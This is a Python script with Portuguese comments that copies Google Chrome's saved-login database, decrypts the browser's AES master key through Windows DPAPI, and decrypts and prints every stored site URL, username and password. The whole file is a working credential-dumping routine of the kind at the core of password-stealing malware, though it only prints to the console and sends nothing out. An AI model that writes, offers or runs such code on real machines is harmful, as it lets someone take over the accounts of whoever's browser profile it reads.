import os
import json
import base64
import sqlite3
import shutil
from Cryptodome.Cipher import AES
import win32crypt  # pywin32

# ---------------- CONFIGURAÇÃO ----------------
chrome_user_data = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default")
login_db_path = os.path.join(chrome_user_data, "Login Data")
local_state_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")

# Copiar o banco para evitar file lock
temp_login_db = "LoginDataCopy.db"
shutil.copy2(login_db_path, temp_login_db)

# ---------------- EXTRAIR CHAVE AES DO LOCAL STATE ----------------
with open(local_state_path, "r", encoding="utf-8") as f:
    local_state = json.load(f)

encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
encrypted_key = base64.b64decode(encrypted_key_b64)

# Remover prefixo DPAPI (5 primeiros bytes)
if encrypted_key[:5] == b"DPAPI":
    encrypted_key = encrypted_key[5:]

# Descriptografar a chave AES com DPAPI
key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# ---------------- ABRIR SQLITE E LER SENHAS ----------------
conn = sqlite3.connect(temp_login_db)
cursor = conn.cursor()

cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
for row in cursor.fetchall():
    url = row[0]
    username = row[1]
    encrypted_password = row[2]

    # Certificar que é bytes
    if isinstance(encrypted_password, memoryview):
        encrypted_password = encrypted_password.tobytes()
    elif isinstance(encrypted_password, str):
        encrypted_password = encrypted_password.encode('utf-8')

    # Ignorar entradas vazias
    if not encrypted_password:
        password = "[vazio]"
    else:
        print(f"DEBUG: len={len(encrypted_password)} prefix={encrypted_password[:3]}")
        try:
            # Apenas AES-GCM moderno (v10/v11)
            if encrypted_password[:3] in (b'v10', b'v11'):
                if len(encrypted_password) < 3 + 12 + 16:
                    password = "[blob muito curto]"
                else:
                    iv = encrypted_password[3:15]  # 12 bytes
                    ciphertext = encrypted_password[15:-16]
                    tag = encrypted_password[-16:]

                    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                    password = cipher.decrypt_and_verify(ciphertext, tag).decode()
            else:
                password = "[Não é v10/v11, formato legado não processado]"
        except Exception as e:
            password = f"[ERRO] {str(e)}"

    print(f"URL: {url}\nUsername: {username}\nPassword: {password}\n{'-'*40}")

# ---------------- LIMPEZA ----------------
conn.close()
os.remove(temp_login_db)
